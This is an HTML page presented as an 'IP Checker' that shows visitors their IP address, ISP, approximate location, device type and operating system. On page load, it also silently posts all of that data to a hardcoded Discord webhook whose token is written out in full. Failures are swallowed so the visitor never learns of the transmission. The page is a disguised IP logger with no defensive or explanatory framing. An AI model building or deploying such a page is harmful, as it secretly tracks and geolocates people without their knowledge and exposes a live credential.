<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Checker</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center h-screen">

    <div class="bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
        <h1 class="text-2xl font-bold mb-4">Check Your IP</h1>
        <div id="ip-info" class="mb-4"></div>
    </div>

    <script>
        function getDeviceInfo() {
            // Get device information from the user agent
            const userAgent = navigator.userAgent;
            let deviceType = "Unknown";
            let os = "Unknown";

            // Simple checks for device type and OS
            if (userAgent.includes("Mobile")) {
                deviceType = "Mobile";
            } else if (userAgent.includes("Tablet")) {
                deviceType = "Tablet";
            } else if (userAgent.includes("Win")) {
                deviceType = "Desktop";
                os = "Windows";
            } else if (userAgent.includes("Mac")) {
                deviceType = "Desktop";
                os = "MacOS";
            } else if (userAgent.includes("Linux")) {
                deviceType = "Desktop";
                os = "Linux";
            }

            return { deviceType, os };
        }

        async function getIPData() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                const { ip, org, city, region, country_name } = data;
                const location = `${city}, ${region}, ${country_name}`;
                const isp = org || "Unknown ISP";

                const { deviceType, os } = getDeviceInfo();

                document.getElementById('ip-info').innerHTML = `
                    <p><strong>IP:</strong> ${ip}</p>
                    <p><strong>ISP:</strong> ${isp}</p>
                    <p><strong>Location:</strong> ${location}</p>
                    <p><strong>Device Type:</strong> ${deviceType}</p>
                    <p><strong>Operating System:</strong> ${os}</p>
                `;

                sendToDiscord(ip, isp, location, deviceType, os);
            } catch (error) {
                // Handle errors silently or show a user-friendly message if desired
            }
        }

        async function sendToDiscord(ip, isp, location, deviceType, os) {
            const message = `IP: ${ip}\nISP: ${isp}\nLocation: ${location}\nDevice Type: ${deviceType}\nOperating System: ${os}`;
            const discordWebhookUrl = 'https://discord.com/api/webhooks/1247107833435258911/807oJEH8MIMSq9OS-MxFssEplKJiy-UVQb1hmtcy3DnYI_azgx5VVsRu2LWrW4nW8688';

            const payload = {
                content: message
            };

            try {
                await fetch(discordWebhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                // Handle errors silently or show a user-friendly message if desired
            }
        }

        getIPData();
    </script>
</body>
</html>
